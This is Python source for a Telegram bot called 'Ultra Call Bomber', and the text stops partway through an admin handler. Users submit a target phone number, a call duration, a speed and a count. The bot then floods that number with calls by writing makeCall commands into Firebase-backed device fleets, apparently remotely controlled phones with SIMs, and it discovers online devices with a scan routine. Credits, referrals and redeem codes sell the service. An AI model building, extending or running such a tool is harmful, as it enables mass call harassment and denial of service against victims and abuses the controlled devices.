import asyncio, json, os, time, logging, random, tempfile, sqlite3
from datetime import datetime, timedelta
from typing import Optional, Union
import aiohttp
from aiohttp import web, ClientTimeout, TCPConnector
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("CallUltra")

# ═══════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════
MAIN_OWNER = 8984851474
SUPER_ADMIN_NAME = "@WhoIsShown"
SUPER_ADMIN_LINK = "https://t.me/WhoIsShown"
SUPER_ADMINS = [8984851474]
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
_DATA_FILE = os.getenv("DATA_FILE", "/data/call_v8.json")
_VERSION = "v8.0-ULTRA"
SPEED_FAST, SPEED_MEDIUM, SPEED_SLOW = 0.05, 0.2, 0.5

# ═══════════════════════════════════════════════════════════════════════
# FORMATTING
# ═══════════════════════════════════════════════════════════════════════
EMOJI_FIRE, EMOJI_STAR, EMOJI_ROCKET, EMOJI_CROWN = "5289722755871162900", "5372849966689566579", "5359664288241829619", "6237927637906364256"
EMOJI_SHIELD, EMOJI_MONEY, EMOJI_PHONE, EMOJI_CHECK = "6235476345451716705", "6244678063775289843", "6239930832128056797", "4958689671950369798"
EMOJI_CROSS, EMOJI_WARNING, EMOJI_LOCK, EMOJI_GIFT = "4958900559139570572", "4958526153955476488", "4956719506027185156", "5084613633418199991"
EMOJI_BELL, EMOJI_GEAR, EMOJI_VIDEO, EMOJI_CLOCK = "5098265504796115765", "5116414868357907335", "5372849966689566579", "5373001317042115569"

_SMALL_CAPS = str.maketrans("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789")
def sc(t): return t.translate(_SMALL_CAPS)
def esc(s): return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;") if s is not None else ""
def em(i, f="⭐"): return f'<tg-emoji emoji-id="{i}">{f}</tg-emoji>' if i else f
def pq(inner, header=""):
    accent = em("5465270065102334742", "➿") * 10
    return f"<blockquote>{accent}\n<b>{header}</b>\n{inner}</blockquote>" if header else f"<blockquote>{accent}\n{inner}</blockquote>"
def result(icon, title, body): return pq(f"{em(icon, '✨')} <b>{sc(title)}</b>\n\n" + "\n".join(body))
async def del_later(msg, delay=3):
    await asyncio.sleep(delay)
    try: await msg.delete()
    except: pass
async def safe_edit(m, t, kb_m=None):
    try: return await m.edit_text(t, reply_markup=kb_m, parse_mode="HTML")
    except: return await m.edit_caption(caption=t, reply_markup=kb_m, parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════
# UI BUILDERS
# ═══════════════════════════════════════════════════════════════════════
try: _ = InlineKeyboardButton(text="x", callback_data="x", style="primary"); _HAS_STYLE = True
except: _HAS_STYLE = False
try: _HAS_ICON = "icon_custom_emoji_id" in InlineKeyboardButton.model_fields
except: _HAS_ICON = False

def btn(t, cb, e=None, f="", s=None):
    lbl = f"{f} {sc(t)}".strip() if (f and not e) else sc(t)
    kw = {"text": lbl, "callback_data": cb}
    if e and _HAS_ICON: kw["icon_custom_emoji_id"] = e
    if _HAS_STYLE and s in ("primary", "success", "danger"): kw["style"] = s
    return InlineKeyboardButton(**kw)
def style_btn(t, s="primary"):
    kw = {"text": sc(t)}
    if _HAS_STYLE and s in ("primary", "success", "danger"): kw["style"] = s
    return KeyboardButton(**kw)
def kb(*rows): return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t, callback_data=c) for t, c in r] for r in rows])

# ═══════════════════════════════════════════════════════════════════════
# RATE LIMITER
# ═══════════════════════════════════════════════════════════════════════
class RateLimiter:
    def __init__(self, p=25): self.p, self.t = p, []
    async def wait(self):
        n = time.time(); self.t = [x for x in self.t if n - x < 1.0]
        if len(self.t) >= self.p: await asyncio.sleep(1.0 - (n - self.t[0]))
        self.t.append(time.time())
_LIMITER = RateLimiter()

# ═══════════════════════════════════════════════════════════════════════
# HTTP
# ═══════════════════════════════════════════════════════════════════════
_SESSION = None
def http():
    global _SESSION
    if _SESSION is None or _SESSION.closed:
        _SESSION = aiohttp.ClientSession(timeout=ClientTimeout(total=10), connector=TCPConnector(limit=300))
    return _SESSION

# ═══════════════════════════════════════════════════════════════════════
# DB
# ═══════════════════════════════════════════════════════════════════════
def _default():
    return {
        "owners": [MAIN_OWNER], "admins": [8256108006], "users": {}, "firebases": [], "banned": [], "approved": [],
        "free_mode": False, "stats": {"total_calls": 0, "failed_calls": 0}, "call_history": {}, "dau_log": {},
        "bot_enabled": True, "maintenance": {"enabled": False, "message": ""}, "texts": {"welcome": ""},
        "media": {"welcome": None}, "settings": {"price_per_call": 1, "durations": [5, 10, 30, 60], "ref_credits": 3},
        "redeem_codes": {}, "fj": {"enabled": False, "channel": "", "link": ""}, "fb_health": {}, "admin_activity": []
    }

def load():
    if "/" in _DATA_FILE: os.makedirs(os.path.dirname(_DATA_FILE), exist_ok=True)
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                d = json.load(f); defs = _default()
                for k, v in defs.items():
                    if k not in d: d[k] = v
                return d
        except: pass
    return _default()

def save(d):
    try:
        fd, tmp = tempfile.mkstemp(dir=os.path.dirname(_DATA_FILE) or ".", prefix=".v8_", suffix=".json")
        with os.fdopen(fd, "w", encoding="utf-8") as f: json.dump(d, f, indent=2)
        os.replace(tmp, _DATA_FILE)
    except Exception as e: log.error(f"save: {e}")

# ═══════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════
def is_owner(u, d): return u in d.get("owners", []) or u in SUPER_ADMINS
def is_admin(u, d): return is_owner(u, d) or u in d.get("admins", [])
def can_use(u, d): return is_admin(u, d) or d.get("free_mode") or u in d.get("approved", [])
def credits(u, d): return d["users"].get(str(u), {}).get("credits", 0)
def mask(n): return n if len(n) <= 4 else n[:2] + "******" + n[-4:]

def add_cr(u, a, d):
    k = str(u)
    if k not in d["users"]: d["users"][k] = {"credits": 0}
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + a
def take_cr(u, a, d):
    k = str(u)
    if k in d["users"] and d["users"][k].get("credits", 0) >= a:
        d["users"][k]["credits"] -= a; return True
    return False

def log_admin(u, a, det=""):
    d = load()
    d.setdefault("admin_activity", []).append({"u": u, "a": a, "d": det, "t": int(time.time())})
    d["admin_activity"] = d["admin_activity"][-200:]
    save(d)

class Sess:
    def __init__(self, u): self.u, self.cancel, self.ok, self.fail, self.task, self.lock = u, False, 0, 0, None, asyncio.Lock()
SESSIONS, LOCK = {}, asyncio.Lock()
CACHED = []
DEVICE_HEALTH = {}

# ═══════════════════════════════════════════════════════════════════════
# FIREBASE ENGINE
# ═══════════════════════════════════════════════════════════════════════
async def make_call(fb, dev, sim, to, dur):
    url = fb.rstrip("/") + f"/clients/{dev}/webhookEvent/makeCall.json"
    for i in range(2):
        try:
            async with http().put(url, json={"from": sim, "to": to, "duration": dur, "isCalled": False, "timestamp": int(time.time())}) as r:
                if 200 <= r.status < 300: return True
        except: pass
        await asyncio.sleep(0.3)
    return False

async def scan(d):
    fbs = d.get("firebases", [])
    if not fbs: return []
    res = []
    async def fetch(fb):
        try:
            async with http().get(fb["url"].rstrip("/") + "/clients.json?shallow=true") as r:
                if r.status != 200: return
                t = (await r.text()).strip()
                if t == "null" or not t: return
                for did in json.loads(t).keys():
                    async with http().get(fb["url"].rstrip("/") + f"/clients/{did}.json") as r2:
                        if r2.status == 200:
                            t2 = (await r2.text()).strip()
                            if t2 != "null" and t2:
                                dd = json.loads(t2)
                                if any([dd.get("isOnline"), dd.get("online"), dd.get("status") == "online"]):
                                    res.append({"fb": fb["url"], "dev": did, "sims": dd.get("sims", []), "name": dd.get("deviceName", did[:8])})
        except: pass
    await asyncio.gather(*(fetch(fb) for fb in fbs))
    return res

def prog_bar(ok, fail, tot, cr, el, dur):
    done = ok + fail
    bar = "█"*min(20, int(20*done/tot)) + "░"*(20-min(20, int(20*done/tot))) if tot else "░"*20
    pct = int((done/tot)*100) if tot else 0
    eta = int((tot-done)/(done/el)) if el > 0.5 and done > 0 else 0
    l = [f"{em(EMOJI_PHONE, '📞')} <b>{sc('ultra bombing')}</b> · {pct}%", f"{bar}\n",
         f"✅ <b>{ok}</b> ❌ <b>{fail}</b> 📊 <b>{done}/{tot}</b>", f"⏱ {dur}s · ETA ~<b>{eta}s</b>"]
    if cr is not None: l.append(f"💳 left: <b>{cr}</b>")
    return pq("\n".join(l) + "\n\n<i>🛑 Stop dabayein.</i>")

async def run_blast(bot, msg, uid, num, dur, cnt, devs, spd):
    async with LOCK:
        if uid in SESSIONS and not SESSIONS[uid].task.done(): return
        s = Sess(uid); SESSIONS[uid] = s
    d = load(); is_reg = not is_admin(uid, d); cost = d.get("settings", {}).get("price_per_call", 1)
    if is_reg and credits(uid, d) < (cnt * cost): cnt = credits(uid, d) // cost
    if cnt <= 0: return await msg.answer(pq(f"{em(EMOJI_CROSS, '❌')} <b>Not enough credits!</b>"))
    
    pm = await msg.answer(prog_bar(0,0,cnt,credits(uid,d) if is_reg else None,0,dur),
                          reply_markup=kb([("sᴛᴏᴘ", "u:stop")]), parse_mode="HTML")
    ok, fail, left, lu, st = 0, 0, cnt, time.time(), time.time()

    async def do_send():
        nonlocal ok, fail, left, lu
        try:
            pool = [{"fb": x["fb"], "dev": x["dev"], "sim": si.get("simSlotIndex", 0), "key": f"{x['dev']}_{si.get('simSlotIndex',0)}"} for x in devs for si in (x.get("sims") or [{}])]
            random.shuffle(pool); idx = 0
            while left > 0:
                async with s.lock:
                    if s.cancel: break
                if not pool: fail += left; break
                t = pool[idx % len(pool)]; idx += 1
                r = await make_call(t["fb"], t["dev"], t["sim"], num, dur)
                async with s.lock:
                    if r:
                        ok += 1; left -= 1
                        if is_reg:
                            db = load(); take_cr(uid, cost, db); db["stats"]["total_calls"] += 1
                            db.setdefault("call_history", {}).setdefault(str(uid), []).append({"num": num, "time": int(time.time())})
                            save(db)
                    else: fail += 1; left -= 1
                    now = time.time()
                    if now - lu >= 1.0 or (ok+fail) == cnt or s.cancel:
                        try: await pm.edit_text(prog_bar(ok,fail,cnt,credits(uid,load()) if is_reg else None, now-st, dur),
                                                reply_markup=kb([("sᴛᴏᴘ", "u:stop")]) if not s.cancel else None, parse_mode="HTML")
                        except: pass
                        lu = now
                await asyncio.sleep(spd * random.uniform(0.85, 1.15))
        except Exception as e: log.error(f"loop: {e}")
    t = asyncio.create_task(do_send()); s.task = t; await t
    async with LOCK:
        if uid in SESSIONS: del SESSIONS[uid]
    try:
        await pm.edit_text(result(EMOJI_PHONE, "ultra complete", [
            f"📞 {mask(num)}", f"⏱ {dur}s", f"✅ <b>{ok}</b>", f"❌ <b>{fail}</b>",
            f"📊 rate: {int(ok/max(1,ok+fail)*100)}%"]),
            reply_markup=kb([("ʜᴏᴍᴇ", "u:home")]), parse_mode="HTML")
    except: pass

# ═══════════════════════════════════════════════════════════════════════
# STATES & ROUTER
# ═══════════════════════════════════════════════════════════════════════
class St(StatesGroup):
    call_num, call_dur, call_spd, call_cnt = State(), State(), State(), State()
    cr_uid, cr_amt = State(), State()
    fb_add = State()
    bcast = State()
    set_welcome, set_media, set_price, set_dur, set_ref = State(), State(), State(), State(), State()
    set_fj, set_maint = State(), State()
    redeem, search = State(), State()
    gen_code_amt, gen_code_uses = State(), State()

R = Router()

async def gate(h, e, d):
    if isinstance(e, (Message, CallbackQuery)):
        u = e.from_user.id if e.from_user else None
        if u and not is_owner(u, load()):
            data = load()
            if not data.get("bot_enabled", True):
                return await e.answer(pq(f"{em(EMOJI_CROSS, '🔌')} <b>Offline</b>"), parse_mode="HTML")
            if data.get("maintenance", {}).get("enabled"):
                return await e.answer(pq(f"{em(EMOJI_WARNING, '🔧')} {data['maintenance'].get('message', 'Maintenance')}"), parse_mode="HTML")
            if data.get("fj", {}).get("enabled"):
                try:
                    m = await e.bot.get_chat_member(data["fj"]["channel"], u)
                    if m.status not in ("member", "administrator", "creator"):
                        return await e.answer(pq(f"{em(EMOJI_LOCK, '🔒')} <b>Join required</b>\n\n<a href='{data['fj']['link']}'>Click to join</a>"), parse_mode="HTML", disable_web_page_preview=True)
                except: pass
    return await h(e, d)

R.message.middleware(gate); R.callback_query.middleware(gate)

# ═══════════════════════════════════════════════════════════════════════
# KEYBOARDS
# ═══════════════════════════════════════════════════════════════════════
def owner_kb(d):
    m = ("🔴 ғʀᴇᴇ: ᴏɴ", "o:free:off") if d.get("free_mode") else ("🟢 ғʀᴇᴇ: ᴏғғ", "o:free:on")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("📞 ᴄᴀʟʟ ʙᴏᴍʙ", "u:call", EMOJI_PHONE, "📞", "danger")],
        [btn("👥 ᴜsᴇʀs", "o:users", EMOJI_STAR, "👥", "primary"), btn("🔥 ғɪʀᴇʙᴀsᴇ", "o:fb", EMOJI_FIRE, "🔥", "danger")],
        [btn("💰 ᴄʀᴇᴅɪᴛs", "o:cr", EMOJI_MONEY, "💰", "success"), btn("📊 sᴛᴀᴛs", "o:stats", EMOJI_ROCKET, "📊", "primary")],
        [btn("🎁 ʀᴇᴅᴇᴇᴍ", "o:redeem", EMOJI_GIFT, "🎁", "primary"), btn("📢 ʙᴄᴀsᴛ", "o:bcast", EMOJI_BELL, "📢", "primary")],
        [btn("⚙️ sᴇᴛᴛɪɴɢs", "o:settings", EMOJI_GEAR, "⚙️", "primary"), btn("📜 ᴀᴄᴛɪᴠɪᴛʏ", "o:activity", EMOJI_GEAR, "📜", "primary")],
        [InlineKeyboardButton(text=m[0], callback_data=m[1])],
        [btn("ʀᴇғʀᴇsʜ", "u:home", EMOJI_GEAR, "🔄")]])

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("📞 ᴄᴀʟʟ ʙᴏᴍʙ", "u:call", EMOJI_PHONE, "📞", "danger")],
        [btn("👥 ᴜsᴇʀs", "o:users", EMOJI_STAR, "👥", "primary"), btn("📊 sᴛᴀᴛs", "o:stats", EMOJI_ROCKET, "📊", "primary")],
        [btn("ʀᴇғʀᴇsʜ", "u:home", EMOJI_GEAR, "🔄")]])

def user_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("📞 ᴄᴀʟʟ ʙᴏᴍʙ", "u:call", EMOJI_PHONE, "📞", "danger")],
        [btn("💰 ᴄʀᴇᴅɪᴛs", "u:credits", EMOJI_MONEY, "💳", "primary"), btn("👥 ʀᴇғᴇʀ", "u:refer", EMOJI_STAR, "👥", "primary")],
        [btn("🎁 ʀᴇᴅᴇᴇᴍ", "u:redeem", EMOJI_GIFT, "🎁", "primary"), btn("📜 ʜɪsᴛᴏʀʏ", "u:hist", EMOJI_CLOCK, "📜", "primary")],
        [btn("ɪɴғᴏ", "u:info", EMOJI_GEAR, "ℹ️", "primary")]])

def owner_nav():
    return ReplyKeyboardMarkup(keyboard=[
        [style_btn("📞 ᴄᴀʟʟ ʙᴏᴍʙ", "danger"), style_btn("👥 ᴜsᴇʀs", "primary")],
        [style_btn("🔥 ғɪʀᴇʙᴀsᴇ", "danger"), style_btn("⚙️ sᴇᴛᴛɪɴɢs", "primary")],
        [style_btn("🏠 ʜᴏᴍᴇ", "primary"), style_btn("🔄 ʀᴇғʀᴇsʜ", "primary")]], resize_keyboard=True, is_persistent=True)

def user_nav():
    return ReplyKeyboardMarkup(keyboard=[
        [style_btn("📞 ᴄᴀʟʟ ʙᴏᴍʙ", "danger")],
        [style_btn("💰 ᴄʀᴇᴅɪᴛs", "primary"), style_btn("🏠 ʜᴏᴍᴇ", "primary")]], resize_keyboard=True, is_persistent=True)

def speed_kb(): return InlineKeyboardMarkup(inline_keyboard=[
    [btn("ғᴀsᴛ", "u:spd:fast", EMOJI_ROCKET, "🚀", "danger"), btn("ᴍᴇᴅɪᴜᴍ", "u:spd:med", EMOJI_STAR, "⚡", "primary"), btn("sʟᴏᴡ", "u:spd:slow", EMOJI_PHONE, "🐢", "success")],
    [btn("❌ ᴄᴀɴᴄᴇʟ", "u:home", EMOJI_CROSS, "❌", "danger")]])

# ═══════════════════════════════════════════════════════════════════════
# START
# ═══════════════════════════════════════════════════════════════════════
@R.message(CommandStart())
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear(); d = load(); uid = msg.from_user.id
    is_new = str(uid) not in d["users"]
    if is_new:
        d["users"][str(uid)] = {"credits": 0, "name": msg.from_user.full_name, "joined_at": int(time.time())}
        today = datetime.now().strftime("%Y-%m-%d")
        d["dau_log"][today] = d["dau_log"].get(today, 0) + 1
        save(d)
    if not can_use(uid, d):
        return await msg.answer(pq(f"{em(EMOJI_CROSS, '⛔')} <b>Access Denied</b>\n\nContact {SUPER_ADMIN_NAME}"))
    
    if is_owner(uid, d): txt = f"{em(EMOJI_CROWN, '👑')} <b>Owner Panel</b> — {_VERSION}"
    elif is_admin(uid, d): txt = f"{em(EMOJI_SHIELD, '🛡')} <b>Admin Panel</b> — {_VERSION}"
    else: txt = d["texts"].get("welcome") or f"{em(EMOJI_PHONE, '📞')} <b>Ultra Call Bomber {_VERSION}</b>\n\n💰 Credits: <b>{credits(uid,d)}</b>"
    
    kbm = owner_kb(d) if is_owner(uid, d) else admin_kb() if is_admin(uid, d) else user_kb()
    nav = owner_nav() if is_owner(uid, d) or is_admin(uid, d) else user_nav()
    final_txt = pq(txt) if not txt.startswith("<blockquote>") else txt
    
    try:
        if d["media"]["welcome"]:
            m_type = d["media"]["welcome"]["type"]; f_id = d["media"]["welcome"]["id"]
            if m_type == "photo": await msg.answer_photo(f_id, caption=final_txt, reply_markup=kbm, parse_mode="HTML")
            else: await msg.answer_video(f_id, caption=final_txt, reply_markup=kbm, parse_mode="HTML")
        else: await msg.answer(final_txt, reply_markup=kbm, parse_mode="HTML")
    except: await msg.answer(final_txt, reply_markup=kbm, parse_mode="HTML")
    
    n = await msg.answer("\u200b", reply_markup=nav); asyncio.create_task(del_later(n, 2))

@R.message(F.text == "🏠 ʜᴏᴍᴇ") | @R.callback_query(F.data == "u:home")
async def nav_home(e: Union[Message, CallbackQuery], state: FSMContext):
    await state.clear(); d = load(); uid = e.from_user.id
    txt = pq(f"{em(EMOJI_PHONE, '📞')} <b>Call Bomber</b>\n\n💰 Credits: <b>{credits(uid,d)}</b>")
    kbm = owner_kb(d) if is_owner(uid, d) else admin_kb() if is_admin(uid, d) else user_kb()
    if isinstance(e, Message): await e.answer(txt, reply_markup=kbm, parse_mode="HTML")
    else: await safe_edit(e.message, txt, kbm)

# ═══════════════════════════════════════════════════════════════════════
# USER FEATURES
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "u:credits")
async def u_credits(cq: CallbackQuery):
    d = load(); await cq.answer(f"💰 Your Credits: {credits(cq.from_user.id, d)}", show_alert=True)

@R.callback_query(F.data == "u:refer")
async def u_refer(cq: CallbackQuery):
    d = load(); uid = cq.from_user.id; rc = d["settings"].get("ref_credits", 3)
    me = await cq.bot.get_me()
    await safe_edit(cq.message, pq(f"👥 <b>Referral</b>\n\nShare this and earn <b>{rc}</b> credits per join:\n\n🔗 https://t.me/{me.username}?start=ref{uid}"),
                    kb([("ʙᴀᴄᴋ", "u:home")]))

@R.callback_query(F.data == "u:redeem")
async def u_redeem(cq: CallbackQuery, state: FSMContext):
    await state.set_state(St.redeem)
    await safe_edit(cq.message, pq(f"🎁 <b>Redeem</b>\n\nSend your code:"), kb([("❌ ᴄᴀɴᴄᴇʟ", "u:home")]))

@R.message(St.redeem)
async def u_redeem_done(msg: Message, state: FSMContext):
    code = msg.text.strip().upper(); d = load(); await state.clear()
    if code not in d.get("redeem_codes", {}): return await msg.answer(pq(f"{em(EMOJI_CROSS, '❌')} <b>Invalid</b>"))
    rc = d["redeem_codes"][code]
    if rc["uses"] <= 0: return await msg.answer(pq(f"{em(EMOJI_CROSS, '❌')} <b>Expired</b>"))
    add_cr(msg.from_user.id, rc["amount"], d)
    rc["uses"] -= 1; save(d)
    await msg.answer(result(EMOJI_GIFT, "redeemed", [f"💰 +{rc['amount']}", f"💳 {credits(msg.from_user.id, d)}"]), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "u:hist")
async def u_hist(cq: CallbackQuery):
    d = load(); hist = d.get("call_history", {}).get(str(cq.from_user.id), [])[-5:]
    if not hist: return await cq.answer("❌ No calls yet", show_alert=True)
    txt = f"{em(EMOJI_CLOCK, '📜')} <b>Last Calls</b>\n\n"
    for h in reversed(hist): txt += f"📞 <code>{mask(h['num'])}</code> · {datetime.fromtimestamp(h['time']).strftime('%d/%m %H:%M')}\n"
    await safe_edit(cq.message, pq(txt), kb([("ʙᴀᴄᴋ", "u:home")]))

# ═══════════════════════════════════════════════════════════════════════
# CALL FLOW
# ═══════════════════════════════════════════════════════════════════════
@R.message(F.text == "📞 ᴄᴀʟʟ ʙᴏᴍʙ") | @R.callback_query(F.data == "u:call")
async def call_start(e: Union[Message, CallbackQuery], state: FSMContext):
    await state.set_state(St.call_num)
    txt = pq(f"{em(EMOJI_PHONE, '📞')} <b>step 1/4 — number</b>")
    if isinstance(e, Message): await e.answer(txt, parse_mode="HTML")
    else: await safe_edit(e.message, txt, kb([("❌ ᴄᴀɴᴄᴇʟ", "u:home")]))

@R.message(St.call_num)
async def call_num(msg: Message, state: FSMContext):
    if not msg.text.replace("+","").isdigit() or len(msg.text) < 7: return await msg.answer("❌ invalid")
    await state.update_data(num=msg.text.strip()); await state.set_state(St.call_dur)
    d = load(); durs = d["settings"].get("durations", [5, 10, 30, 60])
    rows = [[btn(f"{x}s", f"u:dur:{x}", EMOJI_STAR, "⏱", "success" if x==5 else "primary") for x in durs]]
    rows.append([btn("❌ ᴄᴀɴᴄᴇʟ", "u:home", EMOJI_CROSS, "❌", "danger")])
    await msg.answer(pq(f"⏱ <b>step 2/4 — duration</b>"), InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("u:dur:"))
async def call_dur(cq: CallbackQuery, state: FSMContext):
    await state.update_data(dur=int(cq.data.split(":")[2])); await state.set_state(St.call_spd)
    await safe_edit(cq.message, pq(f"⚡ <b>step 3/4 — speed</b>"), speed_kb())

@R.callback_query(F.data.startswith("u:spd:"))
async def call_spd(cq: CallbackQuery, state: FSMContext):
    spd = SPEED_FAST if "fast" in cq.data else SPEED_SLOW if "slow" in cq.data else SPEED_MEDIUM
    await state.update_data(spd=spd); await state.set_state(St.call_cnt)
    await safe_edit(cq.message, pq(f"📊 <b>step 4/4 — count</b>"))

@R.message(St.call_cnt)
async def call_cnt(msg: Message, state: FSMContext):
    try: c = int(msg.text.strip())
    except: return await msg.answer("❌ number")
    d = await state.get_data(); await state.clear()
    devs = CACHED or await scan(load())
    if not devs: return await msg.answer(pq("😴 <b>No devices online</b>"))
    await run_blast(msg.bot, msg, msg.from_user.id, d["num"], d["dur"], c, devs, d["spd"])

@R.callback_query(F.data == "u:stop")
async def stop(cq: CallbackQuery):
    async with LOCK:
        if cq.from_user.id in SESSIONS: SESSIONS[cq.from_user.id].cancel = True
    await cq.answer("🛑 Stopped")

# ═══════════════════════════════════════════════════════════════════════
# OWNER PANELS
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "o:settings")
async def o_settings(cq: CallbackQuery):
    d = load()
    await safe_edit(cq.message, pq(f"⚙️ <b>System Settings</b>\n\nManage everything:"), InlineKeyboardMarkup(inline_keyboard=[
        [btn("✏️ ᴡᴇʟᴄᴏᴍᴇ ᴛᴇxᴛ", "o:set:welcome", EMOJI_GEAR, "✏️", "primary"), btn("🎬 ᴡᴇʟᴄᴏᴍᴇ ᴍᴇᴅɪᴀ", "o:set:media", EMOJI_VIDEO, "🎬", "primary")],
        [btn("💳 ᴄᴀʟʟ ᴘʀɪᴄᴇ", "o:set:price", EMOJI_MONEY, "💳", "success"), btn("⏱ ᴅᴜʀᴀᴛɪᴏɴs", "o:set:dur", EMOJI_STAR, "⏱", "success")],
        [btn("👥 ʀᴇғ ᴄʀᴇᴅɪᴛs", "o:set:ref", EMOJI_STAR, "👥", "primary"), btn("📢 ғᴏʀᴄᴇ ᴊᴏɪɴ", "o:set:fj", EMOJI_BELL, "📢", "primary")],
        [btn("🔧 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ", "o:set:maint", EMOJI_WARNING, "🔧", "danger")],
        [btn("ʙᴀᴄᴋ", "u:home", EMOJI_GEAR, "🔙")]
    ]))

@R.callback_query(F.data == "o:set:welcome")
async def o_set_w(cq: CallbackQuery, state: FSMContext): await state.set_state(St.set_welcome); await safe_edit(cq.message, pq(f"✏️ <b>Send new welcome (HTML ok):</b>"))
@R.message(St.set_welcome)
async def o_set_w_done(msg: Message, state: FSMContext):
    d = load(); d["texts"]["welcome"] = msg.html_text; save(d); await state.clear()
    await msg.answer(pq(f"{em(EMOJI_CHECK, '✅')} <b>Updated!</b>"))

@R.callback_query(F.data == "o:set:media")
async def o_set_m(cq: CallbackQuery, state: FSMContext): await state.set_state(St.set_media); await safe_edit(cq.message, pq(f"🎬 <b>Send photo/video:</b>"))
@R.message(St.set_media)
async def o_set_m_done(msg: Message, state: FSMContext):
    mt, fid = (None, None)
    if msg.photo: mt, fid = "photo", msg.photo[-1].file_id
    elif msg.video: mt, fid = "video", msg.video.file_id
    if not fid: return await msg.answer("❌ invalid")
    d = load(); d["media"]["welcome"] = {"type": mt, "id": fid}; save(d); await state.clear()
    await msg.answer(pq(f"{em(EMOJI_CHECK, '✅')} <b>Media set!</b>"))

@R.callback_query(F.data == "o:set:price")
async def o_set_p(cq: CallbackQuery, state: FSMContext): await state.set_state(St.set_price); await safe_edit(cq.message, pq(f"💳 <b>Price per call:</b>"))
@R.message(St.set_price)
async def o_set_p_done(msg: Message, state: FSMContext):
    try: p = int(msg.text.strip())
    except: return
    d = load(); d["settings"]["price_per_call"] = p; save(d); await state.clear()
    await msg.answer(pq(f"{em(EMOJI_CHECK, '✅')} <b>Price: {p}</b>"))

@R.callback_query(F.data == "o:set:dur")
async def o_set_d(cq: CallbackQuery, state: FSMContext): await state.set_state(St.set_dur); await safe_edit(cq.message, pq(f"⏱ <b>Comma-separated durations:</b>"))
@R.message(St.set_dur)
async def o_set_d_done(msg: Message, state: FSMContext):
    try: durs = [int(x.strip()) for x in msg.text.split(",")]
    except: return
    d = load(); d["settings"]["durations"] = durs; save(d); await state.clear()
    await msg.answer(pq(f"{em(EMOJI_CHECK, '✅')} <b>{durs}</b>"))

@R.callback_query(F.data == "o:set:ref")
async def o_set_r(cq: CallbackQuery, state: FSMContext): await state.set_state(St.set_ref); await safe_edit(cq.message, pq(f"👥 <b>Referral credits:</b>"))
@R.message(St.set_ref)
async def o_set_r_done(msg: Message, state: FSMContext):
    try: r = int(msg.text.strip())
    except: return
    d = load(); d["settings"]["ref_credits"] = r; save(d); await state.clear()
    await msg.answer(pq(f"{em(EMOJI_CHECK, '✅')} <b>Ref: {r}</b>"))

@R.callback_query(F.data == "o:set:fj")
async def o_set_f(cq: CallbackQuery, state: FSMContext): await state.set_state(St.set_fj); await safe_edit(cq.message, pq(f"📢 <b>Send:</b> <code>channel_id | link</code>\n\nOr <b>off</b> to disable."))
@R.message(St.set_fj)
async def o_set_f_done(msg: Message, state: FSMContext):
    d = load()
    if msg.text.lower() == "off": d["fj"] = {"enabled": False, "channel": "", "link": ""}
    elif "|" in msg.text:
        cid, link = [x.strip() for x in msg.text.split("|", 1)]
        d["fj"] = {"enabled": True, "channel": cid, "link": link}
    save(d); await state.clear(); await msg.answer(pq(f"{em(EMOJI_CHECK, '✅')} <b>Force Join updated</b>"))

@R.callback_query(F.data == "o:set:maint")
async def o_set_mt(cq: CallbackQuery, state: FSMContext): await state.set_state(St.set_maint); await safe_edit(cq.message, pq(f"🔧 <b>Send maintenance message:</b>\n\nOr <b>off</b> to disable."))
@R.message(St.set_maint)
async def o_set_mt_done(msg: Message, state: FSMContext):
    d = load()
    if msg.text.lower() == "off": d["maintenance"] = {"enabled": False, "message": ""}
    else: d["maintenance"] = {"enabled": True, "message": msg.html_text}
    save(d); await state.clear(); await msg.answer(pq(f"{em(EMOJI_CHECK, '✅')} <b>Maintenance updated</b>"))

@R.callback_query(F.data == "o:stats")
async def o_stats(cq: CallbackQuery):
    d = load(); today = datetime.now().strftime("%Y-%m-%d"); dau = d.get("dau_log", {}).get(today, 0)
    sz = os.path.getsize(_DATA_FILE)/1024 if os.path.exists(_DATA_FILE) else 0
    txt = pq(f"{em(EMOJI_ROCKET, '📊')} <b>Live Monitor</b>\n\n"
             f"👥 users: <b>{len(d.get('users',{}))}</b>\n"
             f"📞 calls: <b>{d['stats'].get('total_calls',0)}</b>\n"
             f"❌ failed: <b>{d['stats'].get('failed_calls',0)}</b>\n"
             f"📈 DAU: <b>{dau}</b>\n"
             f"💾 storage: <b>{sz:.1f} KB</b>\n"
             f"🟢 devices: <b>{len(CACHED)}</b>")
    await safe_edit(cq.message, txt, kb([("🔄 ʀᴇғʀᴇsʜ", "o:stats"), ("ʙᴀᴄᴋ", "u:home")]))

@R.callback_query(F.data == "o:users")
async def o_users(cq: CallbackQuery):
